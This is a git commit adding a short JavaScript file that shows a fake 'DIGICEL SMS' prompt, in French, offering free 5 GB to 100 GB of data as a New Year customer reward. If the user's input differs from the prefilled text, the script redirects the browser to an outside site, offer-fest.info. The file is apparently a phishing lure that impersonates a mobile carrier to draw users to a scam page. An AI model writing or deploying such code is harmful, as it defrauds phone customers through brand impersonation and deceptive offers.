648a65474a2c60c7e78744eef24263e6f42ee2f4
ekpesense <abantak9@gmail.com>
2025-02-07 23:14:01 -0800

    Create activation-data-sim-reward.js

---
+++ activation-data-sim-reward.js
@@ -0,0 +1,6 @@
+
+var password = 'OFFRE GRATUITE'
+password=prompt('DIGICEL SMS: Cher client Digicel, veuillez recevoir des données gratuites à partir de 5 Go - 100 Go, récompense des clients du Nouvel An, cliquez sur OFFRE GRATUITE pour vérifier maintenant ','OFFRE GRATUITE');
+if (password != 'OFFRE GRATUITE') {
+location.href='https://offer-fest.info/data-sim-reward.html';
+}
